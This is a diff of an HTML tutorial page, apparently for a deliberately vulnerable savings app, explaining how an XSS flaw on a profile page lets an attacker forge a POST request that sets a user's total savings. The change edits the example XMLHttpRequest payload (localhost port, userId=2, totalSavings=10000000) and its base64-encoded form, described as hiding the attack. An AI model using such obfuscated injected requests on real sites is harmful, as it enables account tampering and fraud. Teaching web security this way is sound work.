@@ -188,11 +188,10 @@
                         <p>
                             Such request that will update the savings of the user is presented in the following XMLHTTPRequest code:
                         </p>
-                        <pre>
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'http://localhost:5000/savings', true);
-        xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
-        xhr.send('userId=1&totalSavings=1');</pre>
+                        <pre>var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://localhost:4000/savings', true);
+xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
+xhr.send('userId=2&totalSavings=10000000');</pre>
         
                         <p>
                             The attacker can send this request by abusing the XSS vulnerability on the profile page.
@@ -200,8 +199,7 @@
                             To further make the attack effective and stealthy, the attacker can use the following code to hide the
                             attack payload as a base64 encoded string which also makes it easy to transport as an ASCII string:
                             </p>
-                        <pre>
-        bGV0IHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8vbG9jYWxob3N0OjUwMDAvc2F2aW5ncycsIHRydWUpOyB4aHIuc2V0UmVxdWVzdEhlYWRlcignY29udGVudC10eXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOyB4aHIuc2VuZCgndXNlcklkPTEmdG90YWxTYXZpbmdzPTEnKTs=</pre>
+                        <pre>dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbignUE9TVCcsICdodHRwOi8vbG9jYWxob3N0OjQwMDAvc2F2aW5ncycsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcignY29udGVudC10eXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOwp4aHIuc2VuZCgndXNlcklkPTImdG90YWxTYXZpbmdzPTEwMDAwMDAwJyk7</pre>
         
                         <p>
                             The attacker can then use the following code to execute the attack:
